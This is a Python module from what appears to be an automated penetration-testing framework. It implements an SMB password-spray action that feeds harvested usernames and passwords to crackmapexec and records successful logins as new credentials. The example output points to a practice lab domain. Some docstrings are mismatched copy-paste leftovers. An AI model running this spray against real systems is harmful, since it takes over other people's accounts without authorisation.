from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import parse_crackmapexec_users_output, shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif

class CMESMBPasswordSpray(Action):
    """Password spray via CME: one password against known users on SMB.
    Example command:
    - cme smb 192.168.56.11 -u users.txt -P pass.txt --no-bruteforce
    """

    def __init__(self):
        super().__init__("CMESMBPasswordSpray", "T1110.003", "TA0006", ["noisy", "fast"])
        self.noise = 0.8
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """DomainPartition + ComputerAccount + Credentials (password)."""
        input_motif = ActionInputMotif(
            name="InputMotif_CMESMBPasswordSpray",
            description="Input motif for CMESMBPasswordSpray"
        )

        input_motif.add_template(entity=Entity('DomainPartition', alias='domain'), template_name="existing_domain")

        input_motif.add_template(
            entity=Entity('ComputerAccount', alias='account', controller=True),
            template_name="existing_account",
            match_on="existing_domain",
            relationship_type="belongs_to",
        )

        input_motif.add_template(
            template_name="spray_password",
            entity=Entity('Credentials', alias='credentials'),
            expected_attributes=["password"],
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """Credentials, User, Session for successful logins (linked to Service)."""
        output_motif = ActionOutputMotif(
            name="OutputMotif_PasswordSprayAction",
            description="Output motif for PasswordSprayAction"
        )

        output_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="discovered_user",
            match_on=Entity('DomainPartition'),
            relationship_type='belongs_to',
        )

        output_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="discovered_creds",
            match_on=Entity('DomainPartition'),
            relationship_type='secured_with',
            invert_relationship=True
        )

        return output_motif


    @staticmethod
    def _property_from_creds(creds_ent, prop="password") -> list[str]:
        """Return non-empty password strings from credentials (single entity or entities list)."""
        if not creds_ent or not getattr(creds_ent, "get", None):
            return []
        entities = creds_ent.get("entities")
        if entities:
            return [
                p for e in entities
                if getattr(e, "get", None) and (p := e.get(prop)) and str(p).strip()
            ]
        pwd = creds_ent.get(prop)
        return [pwd] if pwd and str(pwd).strip() else []

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action. Validates service and asset so that
        invalid patterns fail during planning with the same errors as function().
        """
        computer = pattern.get("account")
        domain = computer.get("domain")
        ip_address = computer.get("ip_address")
        svc_id = getattr(computer, "_id", "?")

        users_ent = pattern.get("users")
        user_list = (users_ent.get("entities") or []) if getattr(users_ent, "get", None) else []
        creds_ent = pattern.get("credentials")
        creds_users = self._property_from_creds(creds_ent, prop="username")
        user_list.extend(creds_users)
        count = len(user_list)

        passwords = self._property_from_creds(creds_ent, prop="password")
        if len(passwords) > 1:
            pwd_desc = f"{len(passwords)} password(s)"
        elif len(passwords) == 1:
            pwd_desc = f"'{passwords[0]}'"
        else:
            pwd_desc = "?"


        return [
            f"Try {pwd_desc} against {count} user(s) "
            f"on {domain} domain ({svc_id}) on {ip_address}"
        ]

    def get_target_query(self) -> Query:
        """Return the query for DomainPartition + ComputerAccount + Credentials (password)."""
        query = self.input_motif.get_query()
        query.ret_all()
        return query

    @staticmethod
    def _noop_result(reason: str) -> ActionExecutionResult:
        """Return a no-op execution result with the given reason."""
        return ActionExecutionResult(
            command=["noop"],
            stdout=reason,
            exit_status=0,
            artefacts={},
        )

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Run cme to try creds discovered anywhere on other (smb) services"""
        passwords = self._property_from_creds(pattern.get("credentials"), prop="password")
        if not passwords:
            return self._noop_result("no credentials with password in pattern; skipping")

        usernames = self._property_from_creds(pattern.get("credentials"), prop="username")
        if not usernames:
            return self._noop_result("no credentials with username in pattern; skipping")

        users_path = artefacts.get_path(artefacts.placeholder("cme_password_spray_users.lst"))
        pass_path = artefacts.get_path(artefacts.placeholder("cme_password_spray_password.lst"))
        with open(users_path, "w") as f:
            f.write("\n".join(usernames) + "\n")
        with open(pass_path, "w") as f:
            f.write("\n".join(passwords) + "\n")

        computer = pattern.get("account")
        ip = computer.get("ip_address") if computer else None
        if not ip:
            raise ValueError("Pattern has no computer_account or computer_account has no ip_address")

        # Run crackmapexec SMB scan on the subnet
        cme_command = "/usr/local/bin/cme"
        cme_args = ["smb", ip, "-u", str(users_path), "-p", str(pass_path)]

        try:
            result = shell(cme_command, cme_args, ok_code=[0, 1])
            return result
        except Exception as e:
            error_msg = f"Error running crackmapexec: {str(e)}"
            return ActionExecutionResult(command=[cme_command] + cme_args, stderr=error_msg, exit_status=1)

    def parse_output(self, output: ActionExecutionResult) -> dict[str, list[str]]:
        """
        Parse cme output to extract discovered IP addresses and their computer accounts.

        Args:
            output: ActionExecutionResult containing cme scan output

        Returns:
            Dict mapping ip addresses to computer account details
        """
        if output.exit_status != 0:
            return {}

        # Parse crackmapexec output
        # Format: SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark:iseedeadpeople (Pwn3d!)
        cme_output = output.stdout.strip()

        if not cme_output:
            return {}

        discoveries = parse_crackmapexec_users_output(cme_output)
        return {d['username']: d for d in discoveries}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict[str, list[str]]) -> StateChangeSequence:
        """
        Instantiate output motif changes based on discovered data.

        Args:
            pattern: original Pattern-like mapping used as context for matching.
            discovered_data: mapping returned by parse_output().

        Returns:
            StateChangeSequence: list of state change operations to apply to the KG.
        """
        self.output_motif.reset_context()
        domain = pattern.get('domain')
        changes: StateChangeSequence = []

        if not discovered_data:
            return changes

        for username, details in discovered_data.items():
            new_user = self.output_motif.instantiate(
                "discovered_user",
                match_on_override=domain,
                name=username,
                description=details["description"],
                domain=details["domain"],
            )
            changes.append(new_user)
            
            new_creds = self.output_motif.instantiate(
                "discovered_creds",
                match_on_override=domain,
                username=username,
                password=details["password"],
            )
            changes.append(new_creds)

        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from the CMEUserReconnaissance execution.
        This will update the ComputerAccount entities with the domain controller IP information from the SMB scan.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes